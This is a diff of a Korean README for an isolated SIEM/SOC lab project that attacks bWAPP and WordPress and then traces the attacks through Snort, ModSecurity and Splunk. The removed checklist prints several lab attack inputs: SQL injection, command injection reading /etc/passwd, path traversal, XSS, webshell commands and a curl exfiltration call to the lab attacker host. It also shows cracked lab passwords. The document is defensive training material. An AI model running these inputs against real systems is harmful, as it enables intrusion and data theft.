@@ -1,299 +1,129 @@
-# SIEM 공격 탐지 및 대응 실습 프로젝트
+# SIEM 공격 탐지·대응 실습
 
-> 통합보안관제 가상환경에서 공격 수행 → 탐지/분석 → 관제 대응까지 전체 사이클 실습
+**가상 기업망을 구축하고, 공격이 남긴 로그를 탐지 규칙·관제 화면·사건 보고서로 연결한 보안관제 프로젝트.**
 
-> 📖 참고자료: [공격유형 사전조사 (개념·표적·방어·탐지·오탐정탐)](공격유형-사전조사.md)
-> 🧭 컨설팅 파트: [취약점 진단·위험 평가·개선 권고](컨설팅-취약점진단.md)
-> 🔭 확장 방향: [프로젝트 확장 방향 고민 메모](프로젝트-확장방향.md)
-> 🤝 협업칸(미확정, 참고용): [협업 스터디·환경세팅 가이드](협업/README.md)
+ESXi 위에 웹·DB·관리망을 분리하고, pfSense·Snort·ModSecurity·Splunk로 관제 환경을 구성했습니다. 공격 시뮬레이션을 직접 수행하면서 **어떤 행위가 보이고 무엇을 놓치는지** 비교한 뒤, 다중 로그 분석과 차단 검증까지 기록했습니다.
 
----
+[최종 보고서](phase4-soc/final-report.md) · [킬체인 분석](phase3-killchain/README.md) · [관제 일지](phase4-soc/incident-log.md) · [실습 진행 기록](DEVELOPMENT.md)
 
-## 인프라 현황
+## 1. 목적과 핵심 질문
 
-| 구성요소 | IP | 네트워크 | 역할 |
-|---------|-----|---------|------|
-| VyOS 라우터 | eth0:DHCP / eth1:10.0.0.1 / eth2:10.50.50.1 | out/rf/att | NAT + 라우팅 |
-| pfSense 방화벽 | WAN:10.0.0.254 / LAN:10.0.50.1 / OPT1:10.0.10.1 / OPT2:10.0.100.1 | 전체 | 방화벽 + Snort IPS |
-| att-mint (공격자) | 10.50.50.17 | att-net | 공격 수행 PC (LinuxMint) |
-| Kali Linux (공격자) | 10.50.50.30 | att-net | 공격 전용 PC (Phase 2.5~) |
-| Bee-box (웹서버) | 10.0.10.50 | dmz-net | 취약 웹서버 (bWAPP) |
-| **WordPress** (웹서버) | **10.0.10.80** | dmz-net | **회사 홈페이지 (Phase 2.5~)** |
-| Ubuntu/Splunk (SIEM) | 10.0.100.50 | inner-net | 로그 수집/분석 |
-| **MySQL** (DB) | **10.0.100.60** | inner-net | **DB 서버 (Phase 2.5~)** |
-| mng-mint (관리자) | 10.0.50.100 | mng-net | 관제/관리 PC |
+장비 설치나 경보 발생 확인을 넘어, **공격 수행 → 탐지·분석 → 대응 → 검증 → 보고**의 전체 흐름을 경험하는 것이 목표였습니다.
 
-```
-att-mint(10.50.50.17) ──att-net──→ VyOS ──rf-net──→ pfSense(+Snort IPS)
-Kali   (10.50.50.30) ─┘                                  │
-                                                     ┌─ dmz-net ──→ WordPress(10.0.10.80) [Phase 2.5~]
-                                                     │              Bee-box  (10.0.10.50)
-                                                     │
-                                                     ├─ inner-net ──→ Splunk  (10.0.100.50)
-                                                     │                MySQL   (10.0.100.60) [Phase 2.5~]
-                                                     │
-                                                     └─ mng-net ──→ mng-mint(10.0.50.100, 관제+정상유저)
-```
+| 질문 | 확인한 방법 |
+|---|---|
+| 공격이 성공하면 IDS가 반드시 탐지할까? | 공격 실행 결과와 Snort 경보를 대조하고 미탐 원인을 분석 |
+| 단일 장비가 놓치는 행위를 어떻게 보완할까? | 네트워크 경보와 Apache·WAF·MySQL 로그를 함께 조회 |
+| 어떤 경보를 우선 대응해야 할까? | 정상 접속과 공격 패턴을 비교하고 사건별 판단 근거를 작성 |
+| 차단 규칙을 넣었다는 사실만으로 대응이 끝날까? | 정책 적용 후 재접속·재스캔 결과로 실제 접근 차단 확인 |
 
----
+모든 실험은 소유한 격리 가상망 안에서 수행했습니다. 아래 결과는 해당 시나리오와 수집 범위의 실습 기록입니다.
 
-## 진행 상황
+## 2. 무엇을 구축했나
 
-> 각 단계는 세부 작업 단위로 나누어 두었습니다. 세부 작업을 완료하시면 해당 `- [ ]`를 `- [x]`로 바꾸어 주시고, 상세 결과는 각 phase README의 "결과:" 블록에 기록해 주세요.
-
-### Phase 0. 인프라 구축
-- [x] ESXi 6.7.0 설치 및 데이터스토어 확장
-  - [x] ESXi 6.7.0 설치
-  - [x] 데이터스토어 용량 확장
-- [x] VyOS 라우터 설치 (NAT Masquerade + 정적 라우팅)
-  - [x] VyOS VM 설치 및 3개 인터페이스(out/rf/att) 구성
-  - [x] NAT Masquerade 설정
-  - [x] 정적 라우팅 설정
-- [x] pfSense 방화벽 설치 (4개 인터페이스 + IP 설정)
-  - [x] pfSense VM 설치
-  - [x] WAN/LAN/OPT1/OPT2 4개 인터페이스 할당
-  - [x] 각 인터페이스 IP 설정
-- [x] mng-mint / att-mint 설치
-  - [x] mng-mint(10.0.50.100) 설치 및 mng-net 연결
-  - [x] att-mint(10.50.50.17) 설치 및 att-net 연결
-- [x] Bee-box(bWAPP) 설치 및 DMZ 배치
-  - [x] Bee-box VM 설치 (10.0.10.50)
-  - [x] dmz-net 배치 및 bWAPP 구동 확인
-- [x] Ubuntu + Splunk 8.2.0 설치 (inner-net)
-  - [x] Ubuntu 서버 설치 (10.0.100.50, inner-net)
-  - [x] Splunk 8.2.0 설치 및 웹 접속(:8000) 확인
-- [x] Snort IPS 설치 (WAN, GPLv2 + ET Open)
-  - [x] Snort 패키지 설치 및 WAN 인터페이스 지정
-  - [x] GPLv2 + ET Open 룰셋 등록
-- [x] syslog 원격 전송 설정 (pfSense → Splunk UDP 514)
-- [x] 로그 수집 확인 (index=pfsense, 483 events)
-- [x] Kali Linux VM 설치 (att-net, ESXi에 추가)
-  - [x] OVF 이관 (VMware Workstation → ESXi 6.7, vmx-14 호환)
-  - [x] att-net 네트워크 연결 및 IP(10.50.50.30) 설정 (`/etc/network/interfaces`)
-- [x] Kali 공격 도구 확인 (nmap, nikto, sqlmap, hydra, metasploit, wpscan 등)
-  - [x] 정찰 도구 확인 (nmap, nikto, dirb, wpscan)
-  - [x] 익스플로잇 도구 확인 (sqlmap, hydra, msfconsole)
-- [x] Kali → Bee-box / WordPress 접속 확인
-  - [x] pfSense NAT 경유 접속 확인 (`curl -I http://10.0.0.254` → 200, `curl -I http://10.0.0.254:8080` → 301)
-  - [ ] bWAPP + WordPress 페이지 로딩 확인
-
-### Phase 1. 공격 수행 (Kali/att-mint → Bee-box)
-
-**사전 준비**
-- [x] att-mint 공격 도구 설치 (nmap, nikto, sqlmap, hydra, dirb)
-- [x] bWAPP 접속 확인 (att-mint → pfSense NAT → Bee-box)
-  - [x] `curl -I http://10.0.0.254` 응답 확인 (HTTP 200, Apache 2.2.8 / PHP 5.2.4)
-  - [x] bee/bug 로그인 및 Security Level → low 설정 (att-mint 브라우저 → 10.0.0.254)
-- [x] 0회차 검증 — 공격자 IP `10.50.50.17` 그대로 로깅 확인, 재부팅 후 로그수집 정상
-
-**정찰 단계 (Reconnaissance)**
-- [x] R-1: TCP 포트 스캔 (nmap -sS)
-  - [x] `nmap -sS -Pn -p 1-1000` 실행 및 결과 저장 (scan_tcp.txt)
-  - [x] 열린 포트(80/tcp) 확인
-  - [x] Snort sfPortscan 탐지 확인 ([122:5:1] TCP Filtered Portscan)
-- [x] R-2: 서비스 버전 탐지 (nmap -sV)
-  - [x] `nmap -sV -Pn` 실행 (scan_version.txt)
-  - [x] 웹서버·PHP 버전 식별 (Apache 2.2.8 / PHP 5.2.4 / OpenSSL 0.9.8g, 전부 EOL)
-- [x] R-3: 웹 취약점 스캔 (nikto)
-  - [x] `nikto -h` 실행 및 결과 저장 (nikto_result.txt, 21개 발견)
-  - [x] Snort 탐지 확인 (868 이벤트 — /etc/passwd·traversal·phpinfo·XSS·PHP injection 등)
-- [x] R-4: 디렉토리 브루트포스 (dirb)
-  - [x] `dirb` 실행 및 노출 경로 확인 (drupal·phpmyadmin·webdav·server-status 등, Snort 다수 탐지)
-
-**웹 공격 단계 (Exploitation)**
-- [x] E-1: SQL Injection (수동, bWAPP)
-  - [x] 인증 우회 (`' OR '1'='1`) → 전체 목록 반환
-  - [x] UNION 데이터 추출 → users 계정·비밀번호 해시 유출
-  - [x] Snort SQL Injection 탐지 확인 (SELECT USER + SQL Errors in Response)
-- [x] E-2: SQL Injection (sqlmap 자동화)
-  - [x] `--dbs` DB 목록 추출 (bWAPP, drupageddon, information_schema, mysql)
-  - [x] `--dump`로 users 테이블 덤프 + 해시 크랙
-  - [x] Snort 탐지 확인 (211건 — ET SCAN Sqlmap 등)
-- [x] E-3: Reflected XSS
-  - [x] `<script>alert()</script>` 페이로드 반영 확인
-  - [x] Snort "XSS Attempt" 탐지 확인 (3건, ET WEB_SERVER Script tag in URI)
-- [x] E-4: Stored XSS
-  - [x] 게시글에 쿠키 탈취 스크립트 저장 → 재접속 시 재실행 확인
-  - [x] Snort **미탐지** 확인 (POST body → 응답 body 경로는 URI 검사 룰 우회, IPS 한계점)
-- [x] E-5: OS Command Injection
-  - [x] `; whoami` → `www-data` 출력 확인
-  - [x] `; cat /etc/passwd` → 시스템 계정 목록 전체 노출 확인
-  - [x] Snort 탐지: 요청측 미탐지(POST body), 응답측 `ET ATTACK_RESPONSE passwd` 1건 탐지
-- [x] E-6: Directory Traversal
-  - [x] `../../../etc/passwd` → 시스템 계정 목록 전체 열람 성공
-  - [x] Snort 양방향 탐지 2건: 요청 `ET WEB_SERVER /etc/passwd in URI` + 응답 `ET ATTACK_RESPONSE passwd`
-- [x] E-7: Brute Force (수동)
-  - [x] 워드리스트 생성 및 hydra 시도 (pfSense NAT 301 리다이렉트로 자동화 실패)
-  - [x] 수동 브루트포스 10회 이상 시도 → bee/bug 로그인 성공
-  - [x] Snort **미탐지** 확인 — 개별 요청이 정상 로그인과 동일, 시그니처 기반 IPS로는 행위 기반 공격 탐지 불가
-- [ ] 실제 수행 시각 기록표 작성 (R/E 단계별 실행 시각 → Splunk 타임차트 대조용)
-- [ ] 실습 정리(Cleanup) — Stored XSS 페이로드·산출물·임시 규칙 원복
-
-### Phase 2. 탐지/분석 + 방화벽 정책 (mng-mint)
-
-**Snort 경보 확인**
-- [x] Snort Alerts 확인 (pfSense WebGUI)
-  - [x] pfSense Services > Snort > Alerts 확인 완료 (Active Log에는 최근 정보성 경보만 잔존)
-  - [x] 총 Snort 경보: **1,170건** (Splunk 기준, All time)
-  - [x] Alerts 화면 캡처 저장
-
-**Splunk 로그 분석**
-- [x] Splunk 로그 분석 — 공격자 IP 식별
-  - [x] `"Priority" "10.50.50.17"` → **1,142건 (97.8%)** 확인 — 공격자 IP 특정 완료
-- [x] Splunk 로그 분석 — 공격 유형별 분류
-  - [x] 카테고리별 Top 7: ET WEB_SERVER(640), SCAN(155), WEB_SPECIFIC_APPS(65), POLICY(17), INFO(9), EXPLOIT(4), ATTACK_RESPONSE(2)
-- [x] Splunk 로그 분석 — 시간대별 공격 분포
-  - [x] timechart 실행: 8/3(925건), 8/4(214건), 8/10(31건) — Visualization 차트 확인 완료
-  - [x] 시간대별 추이 차트 캡처
-
-**방화벽 정책 대응**
-- [x] 1차 대응: 공격자 IP 전체 차단 (WAN 규칙)
-  - [x] 적용 전 WAN 규칙 확인 (NAT→10.0.10.50:80 + 기본 Block)
-  - [x] WAN에 10.50.50.17 Block 규칙 추가 및 Apply Changes 완료
-  - [x] 규칙 순서 확인: Block(10.50.50.17) > Pass(NAT HTTP) > Block(기본) — 최상위 배치 정상
-  - [x] 적용 전/후 규칙 캡처
-- [x] 2차 대응: 서비스 제한 (HTTP만 허용, DMZ 아웃바운드 차단)
-  - [x] WAN: 기존 NAT 규칙이 TCP/80만 허용 (추가 변경 불필요)
-  - [x] DMZNET: DMZ→내부(10.0.100.0/24) 차단 규칙 추가
-  - [x] DMZNET: DMZ 아웃바운드 전체 차단 규칙 추가 (리버스쉘 방지)
-- [x] 3차 대응: Snort 차단 모드 전환 (Block Offenders 활성화)
-  - [x] Block Offenders + Kill States 체크, Which IP to Block: SRC
-  - [x] Snort 재시작 및 자동차단 검증 — nmap 스캔 후 curl 타임아웃 확인
-  - [x] 변경 후 설정 캡처 (Snort Block Offenders 설정 + Blocked 목록)
-- [ ] 대응 규칙 적용/해제 순서표 정리 (1~3차 on/off 순서 → Phase 3 검증 선행조건)
-
-### Phase 2.5. 실제 운영 환경 구축 (테크솔루션)
-
-- [x] WordPress 서버 구축 (10.0.10.80, dmz-net)
-  - [x] Ubuntu 20.04 VM 생성 및 네트워크 설정 (gateway4 방식)
-  - [x] Apache + PHP + WordPress 설치 (버전리스 패키지 사용)
-  - [x] 사이트 설정 (techsolution, admin 계정)
-  - [x] WP File Manager 8.0.4 + 취약 엔드포인트 시뮬레이션 (CVE-2020-25213)
-- [x] MySQL 서버 구축 (10.0.100.60, inner-net)
-  - [x] Ubuntu 20.04 VM 생성 및 네트워크 설정
-  - [x] MySQL 8.0.42 설치 + 계정/권한 설정
-  - [x] 커스텀 테이블 (wp_customers, wp_inquiries) + employees 샘플 DB (300,024건)
-  - [x] WordPress ↔ MySQL 연동 확인
-- [x] ModSecurity WAF 설치 (WordPress 서버)
-  - [x] ModSecurity 2.9.3 + OWASP CRS 3.2.0 설치
-  - [x] DetectionOnly 모드 (탐지만, 차단 안 함)
-  - [ ] WAF 동작 확인 (XSS 차단, SQLi 통과+로그)
-- [x] Apache/PHP 의도적 취약점 설정
-  - [x] ServerTokens Full, ServerSignature On
-  - [x] display_errors On (기본값 On 확인), open_basedir 미설정, disable_functions 미설정
-- [x] pfSense 방화벽 규칙 추가
-  - [x] WAN NAT: :8080 → 10.0.10.80:80
-  - [x] DMZNET: WordPress(10.0.10.80) → MySQL(10.0.100.60:3306) 허용
-  - [x] Snort 커스텀 룰 9개 등록 (`local.rules`) — SID 1000001~1000009
-- [x] Splunk 다중 로그 소스 연동 (rsyslog 방식)
-  - [x] Splunk TCP 9514 입력 설정
-  - [x] WordPress rsyslog 설정 (Apache access/error, ModSecurity audit)
-  - [x] MySQL rsyslog 설정 (error log, slow query)
-  - [x] Splunk 수신 확인 (19 events, host=mysql/wordpress)
-  - [x] 신규 인덱스 생성 (idx_web, idx_waf, idx_db)
-  - [x] 필드 추출 설정 (`props.conf`, `transforms.conf`)
-- [x] 정상 트래픽 생성 (mng-mint)
-  - [x] `05-normal-traffic.sh` cron 등록 (5분 간격)
-  - [ ] Splunk에서 정상 트래픽 확인
-- [x] Kali Linux 설정 (ESXi, att-net)
-  - [x] OVF 이관 및 att-net 연결, IP(10.50.50.30) 설정
-  - [x] Bee-box / WordPress 접속 확인 (NAT 경유: :80→Bee-box, :8080→WordPress)
-
-### Phase 3. 킬체인 공격 + 탐지 엔지니어링
-
-**킬체인 공격 수행**
-- [x] 정찰 — wpscan + nmap으로 WordPress 스캔 (T1595)
-  - [x] nmap: 80(Bee-box), 8080(WordPress) open, 443/3306 filtered
-  - [x] wpscan: WordPress 7.1, XML-RPC 활성, readme.html 노출, 1,970 requests
-- [x] 초기 침투 — SQLi 시도 (T1190)
-  - [x] sqlmap `?s=test` → WordPress 코어 Prepared Statement 보호로 SQLi 실패
-  - [x] 공격 시도 자체가 Snort/Splunk에 18건 기록 (탐지 유의미)
-- [x] 인증 공격 — wp-login.php 브루트포스 (T1110)
-  - [x] hydra 13회 시도 → `admin / rlaquddn1@` 크래킹 성공 (약 30초)
-  - [x] Snort SID 1000001 탐지 1,978건, SID 1000002 탐지 8건
-- [x] 지속성 — PHP 웹쉘 삽입 via WP File Manager (T1505.003)
-  - [x] Hello Dolly 플러그인 hello.php에 웹쉘 코드 삽입 (WP File Manager Code Editor)
-  - [x] `curl /?cmd=whoami` → www-data 확인
-- [x] 내부 정찰 — 웹쉘에서 서버 정보 수집 (T1046)
-  - [x] id, hostname, ip addr, wp-config.php DB 인증정보 추출
-  - [x] DMZ IP(10.0.10.80), DB서버(10.0.100.60), 계정(wp_admin/WpAdmin!2024) 확인
-- [x] DB 접근 — wp-config.php 인증정보로 MySQL 접근 (T1213)
-  - [x] DMZ→Inner-net MySQL 접근 성공, 테이블 목록 및 wp_users 데이터 탈취
-  - [x] admin / admin@techsolution.local / bcrypt 해시 획득
-- [x] 유출 시도 — 외부 전송 시도 + 차단 확인 (T1041)
-  - [x] `curl http://10.50.50.30:8888/exfil` → Connection refused (유출 실패)
-
-**탐지 엔지니어링**
-- [x] 커스텀 Snort 룰 탐지 테스트 (9개 룰 → 4개 탐지, 5개 미탐지 — 공격 경로 차이 분석 완료)
-- [x] Splunk 상관분석 쿼리 구축 (7종: 브루트포스 교차, SQLi 교차, 웹쉘 시퀀스, 킬체인 타임라인, DB 이상, Alert 설정, 위험 스코어링)
-- [x] 탐지 개선 전/후 비교표 작성 (ET Open vs 커스텀 + 시그니처 IDS 구조적 한계 분석)
-- [x] 정탐/오탐 판별 기록 (정탐 4건 + False Negative 분석 4건 + 오탐 가능성 검토 4건)
-
-### Phase 4. 관제 운영 (SOC 시뮬레이션)
-
-**모니터링 체계 구축**
-- [x] Splunk 대시보드 구축 (SOC_Monitor, 7개 패널 3단 레이아웃: events, time, att_type, att_ip, waf, alerts, db_approach, login_history)
-- [x] Splunk Alert 설정 (브루트포스, 스캐너, SQLi, 웹쉘, WAF 급증 — Phase 3 실제 탐지 데이터 기반)
-
-**관제 대응**
-- [x] 관제 대응 프로세스 실행 (경보분류→분석→대응→검증)
-  - [x] 킬체인 공격 실시간 대응 (Kali 공격 ↔ mng-mint 관제, 2026-08-27 18:49~19:40)
-  - [x] 정탐/오탐 판별 (정상 트래픽 vs 공격 트래픽 구분)
-- [x] 차단 검증 — pfSense WAN Block 룰(10.50.50.30) 후 재공격 → curl 타임아웃 + WPScan Aborted 확인
-- [x] MITRE ATT&CK 매핑 + 킬체인 분석 다이어그램 (7단계 중 5단계 완전탐지, 1단계 부분탐지, 1단계 차단)
-
-**보고**
-- [x] 관제 일지 작성 (INC-001~INC-006, `phase4-soc/incident-log.md`)
-- [x] 최종 보고서 작성 (`phase4-soc/final-report.md`)
-  - [x] Executive Summary (경영진용)
-  - [x] 공격 분석 (킬체인 7단계 + MITRE ATT&CK 매핑)
-  - [x] 탐지 현황 (Alert 7건 트리거, 탐지 커버리지 5/7)
-  - [x] 대응 조치 (IP 차단 + 검증) + 개선 권고 (6-1~6-3)
-  - [x] 부록: IOC 목록, Splunk 쿼리 모음, 관제 일지 요약
-  - [x] SOC 분석가 사고 확장 (STRIDE/PASTA, IP 평판, EDR 연계, AI 활용)
-
----
-
-## 폴더 구조
-
-```
-project/
-├── README.md                ← 이 파일 (전체 진행상황 체크리스트)
-├── CLAUDE.md                ← Claude 세션 규칙
-├── 프로젝트-확장방향.md        ← 확장 계획 상세 설계
-├── phase1-attack/            ← Phase 1: 공격 수행 기록
-│   ├── README.md
-│   └── images/
-├── phase2-detect/            ← Phase 2: 탐지/분석 + 방화벽 정책
-│   ├── README.md
-│   └── images/
-├── phase2.5-setup/           ← Phase 2.5: 실제 운영 환경 구축
-│   ├── README.md             ← 구축 가이드
-│   ├── scripts/              ← 설치 스크립트 (WordPress, MySQL, ModSec, Splunk UF)
-│   ├── configs/              ← 설정 파일 (Apache, PHP, ModSecurity, Snort, pfSense)
-│   ├── sql/                  ← DB 스키마 + 더미 데이터
-│   └── splunk/               ← Splunk 인덱스·필드추출 설정
-├── phase3-killchain/         ← Phase 3: 킬체인 공격 + 탐지 엔지니어링
-│   ├── README.md
-│   └── images/
-└── phase4-soc/               ← Phase 4: 관제 운영 (SOC 시뮬레이션)
-    ├── README.md
-    ├── images/
-    └── incident-log.md       ← 관제 일지
+```mermaid
+flowchart LR
+    A["공격 실습 · Kali / Linux Mint"] --> V["VyOS · 라우팅 / NAT"]
+    V --> F["pfSense + Snort · 방화벽 / IPS"]
+    F --> W["DMZ · bWAPP / WordPress + ModSecurity"]
+    W --> D["내부망 · MySQL"]
+    F --> S["Splunk · 수집 / 분석 / 대시보드 / 경보"]
+    W --> S
+    D --> S
+    S --> M["관리망 · 관제 분석 / 사건 기록"]
+    M -.->|"정책 적용·재검증"| F
 ```
 
----
+| 계층 | 구성과 역할 | 산출물 |
+|---|---|---|
+| 가상 인프라 | ESXi, VyOS, pfSense로 공격망·DMZ·내부망·관리망 분리 | [구성 정보](DEVELOPMENT.md#인프라-현황) |
+| 서비스·로그 | bWAPP, WordPress, MySQL, ModSecurity, rsyslog 기반 로그 수집 | [구축 문서·스크립트·설정](phase2.5-setup/) |
+| 탐지 엔지니어링 | 커스텀 Snort 룰 9개, Splunk 상관분석 쿼리 7종 | [탐지 실험과 비교](phase3-killchain/README.md) |
+| SOC 운영 | SOC_Monitor 대시보드, 5종 Alert, 경보 분류·차단 검증 | [관제 운영 기록](phase4-soc/README.md) |
+| 분석·보고 | 사건 일지 INC-001~006, ATT&CK 매핑, 개선 권고 | [관제 일지](phase4-soc/incident-log.md), [최종 보고서](phase4-soc/final-report.md) |
 
-## 산출물 목록
+## 3. 어떤 실험을 했고, 무엇을 확인했나
 
-| 산출물 | 위치 | 상태 |
-|--------|------|------|
-| 인프라 구축 보고서 | `../13_SIEM_실습보고서.md` / `.docx` | 완료 |
-| 공격 실행 기록 (Bee-box) | `phase1-attack/README.md` | **완료** (R-1~R-4, E-1~E-7) |
-| Splunk 분석 + 방화벽 정책 | `phase2-detect/README.md` | **완료** (1차·2차·3차 대응) |
-| 환경 확장 설계서 | `프로젝트-확장방향.md` | **완료** |
-| 환경 구축 스크립트·설정 | `phase2.5-setup/` | **진행 중** (WP+MySQL+WAF+rsyslog 완료, 인덱스·필드추출 미완) |
-| 킬체인 공격 기록 | `phase3-killchain/README.md` | **완료** (7단계 킬체인 + 탐지 엔지니어링) |
-| SOC 대시보드 + Alert + 관제 대응 | `phase4-soc/README.md` | **완료** (대시보드 7패널 + Alert 5개 + 킬체인 대응 + MITRE 매핑) |
-| 관제 일지 | `phase4-soc/incident-log.md` | **완료** (INC-001~INC-006) |
-| 최종 보고서 | `phase4-soc/final-report.md` | **완료** (8장: 요약+인프라+공격+탐지+대응+개선+부록+사고확장) |
+### 기초 공격과 탐지·차단 비교
+
+bWAPP을 대상으로 정찰, SQL Injection, XSS, 명령 삽입, 경로 탐색, 인증 공격을 수행하고 실제 결과를 Snort/Splunk와 대조했습니다. 이후 공격자 IP 차단, DMZ 통신 제한, IPS 차단 모드를 적용했습니다.
+
+저장형 XSS나 정상 로그인처럼 보이는 반복 요청 등에서는 경보가 충분하지 않았습니다. 요청 URI에 잘 드러나는 패턴과 POST body·애플리케이션 동작으로 이어지는 패턴의 관측 차이를 확인했습니다.
+
+→ [공격 실행 기록](phase1-attack/README.md) · [탐지 분석과 방화벽 대응](phase2-detect/README.md)
+
+### 웹 침해 시나리오와 탐지 엔지니어링
+
+WordPress·MySQL 환경에서 정찰부터 인증 공격, 웹쉘 실행, 내부 정보 확인, DB 접근, 외부 전송 시도까지 이어지는 시나리오를 구성했습니다. SQLi 시도는 WordPress 코어에서 실패했으며, 실제 후속 경로는 관리자 인증 후 플러그인 편집을 통한 웹쉘 삽입이었습니다.
+
+| 관찰 | 결과가 의미하는 것 |
+|---|---|
+| 커스텀 Snort 룰 9개 중 4개 SID에서 경보 확인 | 설계 시 가정한 직접 익스플로잇과 실제 관리자 인증·파일 편집 경로가 달라, 시그니처만으로 전체 행위를 포착하지 못함 |
+| Apache·WAF·Snort 로그를 교차 조회 | 인증 시도와 웹쉘 요청을 네트워크 경보에만 의존하지 않고 분석 |
+| DB 접근 전용 Alert 부재 | 웹쉘 요청 로그로 간접 관찰할 수 있어도 DB 쿼리의 정상·비정상 여부는 별도 감사 로그가 필요 |
+| 외부 전송 시도에서 `Connection refused` | 전송 실패는 관찰했지만, 이 응답만으로 방화벽 차단을 단독 입증할 수는 없음 |
+
+→ [킬체인 실행·상관분석·미탐 원인](phase3-killchain/README.md)
+
+### SOC 시뮬레이션과 대응 검증
+
+2026-08-27 관제 실습에서는 공격과 정상 접속을 구분하고, 경보를 사건으로 정리한 뒤 pfSense에 공격자 IP 차단 정책을 적용했습니다. 이후 **curl 타임아웃과 WPScan 중단**을 확인해 접근 차단 결과를 기록했습니다.
+
+| 결과물·기록 | 확인한 내용 |
+|---|---|
+| Splunk Alert 5종 | 브루트포스·스캐너·SQLi·웹쉘·WAF 급증 조건 정의 |
+| 해당 관제 회차의 Alert 트리거 7건 | 설정한 Alert 종류 수와 실제 발생 횟수를 구분 |
+| 7단계 시나리오의 탐지 범위 | 보고서 분류상 5단계 완전 탐지, DB 접근 1단계 부분 탐지. 외부 전송 단계는 실패 기록이며 차단 원인 확정에는 추가 근거 필요 |
+| 사건 일지 6건 | 탐지 출처·판별 근거·위험도·대응·검증을 사건별로 기록 |
+| 최종 보고서 | 경영진 요약, 공격·탐지·대응 분석, IOC, 쿼리, 개선 권고 정리 |
+
+이 수치는 정해진 랩 시나리오의 결과이며 일반적인 탐지 정확도나 제품 성능 지표는 아닙니다. 스캐너 Alert는 실행 주기와 공격 시각이 맞지 않아 트리거를 놓쳤고, WAF 로그는 전용 `idx_waf` 대신 `idx_web`에서 조회했습니다.
+
+→ [SOC 실행 기록](phase4-soc/README.md) · [최종 보고서](phase4-soc/final-report.md)
+
+## 4. 실습에서 배운 점
+
+### 공격 도구 이름보다 실제 경로를 봐야 한다
+
+같은 웹쉘 삽입이라도 취약 엔드포인트 직접 호출과 관리자 인증 후 플러그인 편집은 서로 다른 흔적을 남겼습니다. 룰을 추가하는 것만으로 충분하지 않았고, **실제로 지나간 경로와 센서가 볼 수 있는 범위**를 먼저 확인해야 했습니다.
+
+### 경보 수와 공격 성공 여부는 다르다
+
+실패한 SQLi도 경보를 만들었고, DB 접근은 전용 경보 없이 진행됐습니다. 경보는 조사 시작점이며, 성공 여부와 영향은 응답·서비스 상태·여러 로그를 함께 보고 판단해야 한다는 점을 배웠습니다.
+
+### SIEM의 가치는 로그를 함께 해석하는 데 있다
+
+Snort만으로 부족한 인증·웹쉘 행위를 Apache와 ModSecurity 로그로 보완했습니다. 반대로 MySQL error/slow 로그만으로는 쿼리 의도를 충분히 설명하기 어려웠습니다. 탐지 쿼리 이전에 **무슨 로그가 수집되고, 어떤 정보가 빠져 있는지** 알아야 했습니다.
+
+### 대응에는 검증과 기록이 따라야 한다
+
+방화벽 정책 적용 후 재접속·재스캔을 수행하고, 판단 근거와 결과를 사건 일지에 남겼습니다. 전송 실패와 정책 효과의 인과관계를 구분하는 것도 대응 검증의 일부입니다.
+
+## 5. 한계와 다음 아이디어
+
+| 남은 과제 | 이번 실습에서 얻은 개선 방향 |
+|---|---|
+| DB 접근의 부분 가시성 | MySQL 감사 로그를 수집하고 정상 쿼리와 비교할 기준 마련 |
+| 경보 스케줄의 사각지대 | 검색 주기·시간 범위·임계값을 짧은 공격과 정상 트래픽으로 재검증 |
+| WAF 로그 혼합 수집, DetectionOnly 운영 | 전용 인덱스 분리와 차단 모드 전환 전 정상 요청 영향 확인 |
+| 네트워크·웹 로그 중심 조사 | EDR 프로세스 트리·파일 변경·포렌식 증거와 연결 |
+| 수동 사건 처리 | IOC·관제 기록을 구조화하고 승인 가능한 대응 자동화로 확장 |
+
+EDR·AI 관제·자동 대응은 확장 아이디어이며 이번 실습의 완성 기능으로 포함하지 않습니다. 상세 논의는 [최종 보고서의 사고 확장](phase4-soc/final-report.md)과 [확장 방향 메모](프로젝트-확장방향.md)에 있습니다.
+
+## 6. 결과물 찾아보기
+
+| 문서·디렉터리 | 내용 |
+|---|---|
+| [phase4-soc/final-report.md](phase4-soc/final-report.md) | 프로젝트 결과를 한 번에 읽는 최종 보고서 |
+| [phase4-soc/incident-log.md](phase4-soc/incident-log.md) | INC-001~006 사건별 분석·대응 기록 |
+| [phase1-attack/](phase1-attack/) | 기초 공격 실행·출력·탐지 증적 |
+| [phase2-detect/](phase2-detect/) | Splunk 분석·방화벽 정책·IPS 대응 |
+| [phase2.5-setup/](phase2.5-setup/) | 구축 스크립트·설정·SQL·로그 수집 구성 |
+| [phase3-killchain/](phase3-killchain/) | 킬체인·커스텀 룰·상관분석·미탐 원인 |
+| [phase4-soc/](phase4-soc/) | 대시보드·Alert·관제 실습·화면 증적 |
+| [공격유형-사전조사.md](공격유형-사전조사.md) | 공격 원리·탐지·방어 사전 조사 |
+| [컨설팅-취약점진단.md](컨설팅-취약점진단.md) | 위험 평가와 개선 권고 |
+| [DEVELOPMENT.md](DEVELOPMENT.md) | 원래 진행 체크리스트·IP 구성·잔여 작업 |
+
+저장소는 실습 기록·설정·스크립트를 제공하며 ESXi VM 이미지나 즉시 실행되는 통합 환경은 포함하지 않습니다. 재현 시에는 [환경 구축 문서](phase2.5-setup/README.md)와 [진행·환경 기록](DEVELOPMENT.md)을 함께 확인하세요.
